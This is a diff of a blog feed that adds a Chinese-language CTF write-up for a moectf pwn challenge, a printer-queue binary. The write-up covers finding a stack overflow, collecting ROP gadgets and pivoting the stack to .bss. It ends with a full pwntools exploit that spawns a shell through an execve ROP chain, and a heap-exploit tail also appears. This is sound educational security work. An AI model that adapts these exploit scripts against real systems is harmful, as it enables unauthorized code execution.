@@ -211,7 +211,7 @@ enter idx(0~15):
 ^C
 
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img alt=&quot;af013ba0-03a6-4a40-aa91-970b91e11591&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://dxfaker.top/images/post/af013ba0-03a6-4a40-aa91-970b91e11591.png&quot; alt=&quot;af013ba0-03a6-4a40-aa91-970b91e11591&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;这里快了一步，直接释放了三个&lt;/p&gt;
 &lt;p&gt;可以看到都被丢到tcachebin里去了&lt;/p&gt;
 &lt;p&gt;关系是LIFO,具体就是头插，最先插的进入尾部&lt;/p&gt;
@@ -246,7 +246,7 @@ enter idx(0~15):
 &lt;/blockquote&gt;
 &lt;p&gt;所以说也就是1指向0的指针&lt;/p&gt;
 &lt;p&gt;能泄露堆地址了&lt;/p&gt;
-&lt;p&gt;![屏幕截图 2026-09-19 180015](D:\mywebsite\mizukii\public\images\post\屏幕截图 2026-09-19 180015.png)&lt;/p&gt;
+&lt;p&gt;![屏幕截图 2026-09-19 180015](/images/post/屏幕截图 2026-09-19 180015.png)&lt;/p&gt;
 &lt;p&gt;然后就是泄露libc基址,想要拿到libc基址，那么就得考虑unsortedbin&lt;/p&gt;
 &lt;p&gt;这里kr一下第一版的东西&lt;/p&gt;
 &lt;p&gt;各个私募bin的优先级&lt;/p&gt;
@@ -548,6 +548,262 @@ delete(1)
 p.sendline(b&apos;cat flag; cat /flag; cat ./flag; echo ===PWNED===&apos;)
 
 
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>栈迁移相关</title><link>https://dxfaker.top/posts/26moe7/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe7/</guid><description>这个是真的讲出来了</description><pubDate>Mon, 21 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+&lt;p&gt;图为新建的虚拟机&lt;/p&gt;
+&lt;p&gt;赫赫，最快的一集&lt;/p&gt;
+&lt;p&gt;6ay85L2s5LiA5Lq/5Liq5q+U6LWb5L2g5bCx5omT5ZCn&lt;/p&gt;
+&lt;h1&gt;自助打印机&lt;/h1&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;main&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned __int16 v4; // [rsp+Eh] [rbp-2h] BYREF
+
+  IO_setvbuf(stdin, 0, 2, 0);
+  IO_setvbuf(stdout, 0, 2, 0);
+  alarm(30);
+  IO_puts(&quot;=== Self-Service Printer Queue ===&quot;);
+  IO_puts(&quot;[printer] Submit a two-byte little-endian print queue length.&quot;);
+  IO_puts(&quot;[printer] Send print queue data:&quot;);
+  read_exact(&amp;amp;v4, 2);
+  if ( v4 &amp;amp;&amp;amp; v4 &amp;lt;= 0x400u )
+  {
+    read_exact(&amp;amp;print_queue, v4);
+    IO_puts(&quot;[printer] Print queue stored.&quot;);
+    IO_puts(&quot;[printer] Confirm the print job with a 40-byte ticket:&quot;);
+    confirm_print_job();
+    return 0;
+  }
+  else
+  {
+    IO_puts(&quot;[printer] Invalid print queue length.&quot;);
+    return 0;
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;查看print_queue大小&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; readelf -sW ./printer_queue | grep -i print_queue
+   893: 00000000004a9a80  1024 OBJECT  GLOBAL DEFAULT   21 print_queue
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看confirm_print_job&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 confirm_print_job()
+{
+  _BYTE v1[16]; // [rsp+0h] [rbp-10h] BYREF
+
+  read_exact(v1, 40);
+  return IO_puts(&quot;[printer] Job confirmation accepted.&quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;明显溢出&lt;/p&gt;
+&lt;p&gt;现在找system以及/bin/sh&lt;/p&gt;
+&lt;p&gt;WSL找半天没找到&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ROPgadget --binary ./printer_queue | grep -E &apos;syscall|pop rax|pop rdi|pop rsi|pop rdx&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;由于溢出后空间过小，所以我们考虑栈迁移&lt;/p&gt;
+&lt;p&gt;先放一下前置&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://serious-telescope-709.notion.site/30b27bbcf238803997f3c724d325b721&quot;&gt;栈迁移&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ext:0000000000401878 ; __unwind {
+.text:0000000000401878                 endbr64
+.text:000000000040187C                 push    rbp
+.text:000000000040187D                 mov     rbp, rsp
+.text:0000000000401880                 sub     rsp, 10h
+.text:0000000000401884                 lea     rax, [rbp+var_10]
+.text:0000000000401888                 mov     esi, 28h ; &apos;(&apos;
+.text:000000000040188D                 mov     rdi, rax
+.text:0000000000401890                 call    read_exact
+.text:0000000000401895                 mov     edi, offset aPrinterJobConf ; &quot;[printer] Job confirmation accepted.&quot;
+.text:000000000040189A                 call    _IO_puts
+.text:000000000040189F                 nop
+.text:00000000004018A0                 leave
+.text:00000000004018A1                 retn
+.text:00000000004018A1 ; } // starts at 401878
+.text:00000000004018A1 confirm_print_job endp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到我们覆盖完&lt;code&gt;saved rbp&lt;/code&gt; 和返回地址之后在&lt;code&gt;leave; retn&lt;/code&gt;阶段才会使用被覆盖的 &lt;code&gt;saved rbp&lt;/code&gt; 和返回地址&lt;/p&gt;
+&lt;p&gt;只要把写入地址空间改大，然后再用经典的ROP重新跳转回main再写入一遍，那不就好了&lt;/p&gt;
+&lt;p&gt;然后就是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;strings -tx ./printer_queue | grep &quot;/bin/sh&quot;
+ROPgadget --binary ./printer_queue | grep &quot;pop rax ; ret&quot;
+ROPgadget --binary ./printer_queue | grep &quot;pop rdi ; ret&quot;
+ROPgadget --binary ./printer_queue | grep &quot;pop rsi ; ret&quot;
+ROPgadget --binary ./printer_queue | grep &quot;pop rdx ; ret&quot;
+ROPgadget --binary ./printer_queue | grep &quot;syscall&quot;
+ROPgadget --binary ./printer_queue | grep &quot;leave ; ret&quot;
+ROPgadget --binary ./printer_queue | grep &quot;ret$&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl+F&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;pop rdi ; ret&lt;/code&gt;,&lt;code&gt;pop rsi ; ret&lt;/code&gt;,&lt;code&gt;pop rax ; ret&lt;/code&gt;,&lt;code&gt;syscall&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0x432e48 : pop rdi ; ret
+0x402b86 : pop rsi ; ret
+0x42149b : pop rax ; ret
+0x401324 : syscall
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这不就挺干净&lt;/p&gt;
+&lt;p&gt;ROP不就拼拼凑凑&lt;/p&gt;
+&lt;p&gt;.bss&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; readelf -S ./printer_queue | grep .bss
+  [15] .tbss             NOBITS           00000000004a3ed0  000a2ed0
+  [21] .bss              NOBITS           00000000004a9a20  000a8a08
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;main以及**&lt;code&gt;confirm_print_job&lt;/code&gt;**，用于再一次跳回函数，毕竟只有一个read，第一次只能造成栈迁移，第二次才是真正攻击的时候&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/moectf/自助打印机/attachment$ readelf -s ./printer_queue | grep -E &quot; main$| confirm_print_job&quot;
+   133: 0000000000401878    42 FUNC    LOCAL  DEFAULT    7 confirm_print_job
+  1526: 00000000004018a2   217 FUNC    GLOBAL DEFAULT    7 main
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;现在是system以及/bin/sh搜索的事情&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;strings -tx ./printer_queue | grep &quot;/bin/sh&quot;
+(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/moectf/自助打印机/attachment$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;呃，那我们直接考虑execve吧&lt;/p&gt;
+&lt;p&gt;x86-64:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;rax = 59          # execve 系统调用号
+rdi = &quot;/bin/sh&quot;   # 文件名指针
+rsi = 0           # argv = NULL
+rdx = 0           # envp = NULL
+syscall
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;现在还差一个rdx = 0&lt;/p&gt;
+&lt;p&gt;rdx的链不干净&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0x4684fc : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;弹一个值给 &lt;code&gt;rdx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;把 &lt;code&gt;eax&lt;/code&gt; 清零&lt;/li&gt;
+&lt;li&gt;再弹 4 个垃圾值给 &lt;code&gt;rbx&lt;/code&gt;、&lt;code&gt;r12&lt;/code&gt;、&lt;code&gt;r13&lt;/code&gt;、&lt;code&gt;rbp&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;涉及rax相关，所以先考虑把rdx设置好,再把rax设置&lt;/p&gt;
+&lt;p&gt;那么就是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;execve_chain = flat([
+    # rdx = 0，同时 eax 被清零
+    pop_rdx_xor_eax_pop4, 0, 0, 0, 0, 0,
+
+    # rax = 59
+    pop_rax, 59,
+
+    # rdi = binsh
+    pop_rdi, binsh,
+
+    # rsi = 0
+    pop_rsi, 0,
+
+    # syscall
+    syscall
+])
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;现在就可以考虑第一步该怎么操作了&lt;/p&gt;
+&lt;p&gt;由于给的空间真的太小太小，所以第一步必然不考虑直接跑到.bss，而是想办法怎么构造出ROP&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://dxfaker.top/images/post/adccb62b-ad4c-4a0c-9fbb-22fad7fd0a7f.png&quot; alt=&quot;adccb62b-ad4c-4a0c-9fbb-22fad7fd0a7f&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;可以看到main的两个raed，一个写入内容太小，一个是滚木地址，那总得确认第二个是写入到哪的吧&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bss:00000000004A9A20 __bss_start     db ?                    ; DATA XREF: __do_global_dtors_aux+4↑r
+.bss:00000000004A9A20                                         ; __do_global_dtors_aux:loc_4017CA↑w
+.bss:00000000004A9A20                                         ; Alternative name is &apos;completed.1&apos;
+.bss:00000000004A9A21                 align 20h
+.bss:00000000004A9A40 object_0        db    ? ;               ; DATA XREF: frame_dummy+F↑o
+.bss:00000000004A9A41                 db    ? ;
+.bss:00000000004A9A42                 db    ? ;
+.bss:00000000004A9A43                 db    ? ;
+.bss:00000000004A9A44                 db    ? ;
+.bss:00000000004A9A45                 db    ? ;
+.bss:00000000004A9A46                 db    ? ;
+.bss:00000000004A9A47                 db    ? ;
+.bss:00000000004A9A48                 db    ? ;
+...
+.bss:00000000004A9A80                 public print_queue
+.bss:00000000004A9A80 print_queue     db    ? ;               ; DATA XREF: main+AF↑o
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;还有天然的写入，无敌了&lt;/p&gt;
+&lt;p&gt;那么就是先把ROP以及/bin/sh写入进去,然后再在 &lt;code&gt;confirm_print_job&lt;/code&gt; 中栈迁移到 &lt;code&gt;.bss&lt;/code&gt;，最后在&lt;code&gt;.bss&lt;/code&gt; 上执行 &lt;code&gt;execve(&quot;/bin/sh&quot;, 0, 0)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;忘记说了,还有个bin的小巧思&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;因为 &lt;strong&gt;&lt;code&gt;&quot;/bin/sh\x00&quot;&lt;/code&gt; 这个字符串在内存里紧跟在 ROP 链的后面&lt;/strong&gt;，所以它的地址 = ROP 链起始地址 + ROP 链长度。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;但是呢,ROP链又得有&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pop_rdi, binsh_addr
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;那怎么办呢,&lt;s&gt;只有天知道&lt;/s&gt;&lt;/p&gt;
+&lt;p&gt;你我都是懒鬼，不可能都直接把ROP长度算一遍对吧&lt;/p&gt;
+&lt;p&gt;那在python里面顺便算了不就好了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#只在 Python 内存里存在，用来算长度
+rop_part = flat([
+    0,
+    pop_rdx, 0, 0, 0, 0, 0,
+    pop_rax, 59,
+    pop_rdi, 0,         
+    pop_rsi, 0,
+    syscall
+])
+binsh_addr = bss + len(rop_part)
+rop_chain = flat([
+    0,
+    pop_rdx, 0, 0, 0, 0, 0,
+    pop_rax, 59,
+    pop_rdi, binsh_addr,   
+    pop_rsi, 0,
+    syscall
+]) + b&quot;/bin/sh\x00&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;为什么一开始有一个0呢&lt;/p&gt;
+&lt;p&gt;回顾一下leave; ret&lt;/p&gt;
+&lt;p&gt;拆解中有一步pop rbp,这是在.bss上弹一个值给rbp，那总不能给他pop_rdx吧&lt;/p&gt;
+&lt;p&gt;那就放0占位好了&lt;/p&gt;
+&lt;p&gt;exp&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+
+context.arch = &apos;amd64&apos;
+context.log_level = &apos;debug&apos;
+
+bss       = 0x4a9a80
+leave_ret = 0x401876
+
+pop_rax   = 0x42149b
+pop_rdi   = 0x432e48
+pop_rsi   = 0x402b86
+pop_rdx   = 0x4684fc  
+syscall   = 0x401324
+
+rop_part = flat([
+    0,
+    pop_rdx, 0, 0, 0, 0, 0,
+    pop_rax, 59,
+    pop_rdi, 0,
+    pop_rsi, 0,
+    syscall
+])
+binsh_addr = bss + len(rop_part)
+argv_addr = binsh_addr + 8
+
+rop_chain = flat([
+    0,
+    pop_rdx, 0, 0, 0, 0, 0,
+    pop_rax, 59,
+    pop_rdi, binsh_addr,
+    pop_rsi, argv_addr,
+    syscall
+]) + b&quot;/bin/sh\x00&quot; + p64(binsh_addr) + p64(0)
+
+p = remote(&apos;127.0.0.1&apos;, 51356)
+
+p.recvuntil(b&quot;data:&quot;)  
+p.send(p16(0x400))
+p.send(rop_chain.ljust(0x400, b&apos;\x00&apos;))
+
+payload = b&apos;A&apos; * 16 + p64(bss) + p64(leave_ret)
+payload = payload.ljust(0x28, b&apos;A&apos;)
+p.send(payload)
+
+p.interactive()
 &lt;/code&gt;&lt;/pre&gt;
 </content:encoded></item><item><title>UAF+heap基础</title><link>https://dxfaker.top/posts/ezheap1/</link><guid isPermaLink="true">https://dxfaker.top/posts/ezheap1/</guid><description>啊啊啊啊啊弄懂了跟蛇了一样有没有懂的</description><pubDate>Thu, 17 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;开堆&lt;/h1&gt;
 &lt;p&gt;这个题我搞了两天（并非无时无刻都在搞），不过学到挺多东西的&lt;/p&gt;
